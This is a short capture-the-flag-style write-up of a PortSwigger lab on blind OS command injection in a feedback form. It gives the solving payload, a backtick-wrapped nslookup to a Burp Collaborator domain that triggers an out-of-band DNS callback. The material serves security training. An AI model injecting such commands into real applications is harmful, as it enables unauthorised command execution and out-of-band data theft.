
# Blind OS command injection with out-of-band interaction

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.


---------------------------------------------

References: 

- https://portswigger.net/web-security/os-command-injection

- https://book.hacktricks.xyz/pentesting-web/command-injection



![img](images/Blind%20OS%20command%20injection%20with%20out-of-band%20interaction/1.png)

---------------------------------------------

There is a function to submit feedback:



![img](images/Blind%20OS%20command%20injection%20with%20out-of-band%20interaction/2.png)

In this case the command injection is achieved with the payload:

```
`nslookup 7s0qd0oqa0r71b9pewc0nu7a41asynmc.oastify.com`
```




![img](images/Blind%20OS%20command%20injection%20with%20out-of-band%20interaction/3.png)




![img](images/Blind%20OS%20command%20injection%20with%20out-of-band%20interaction/4.png)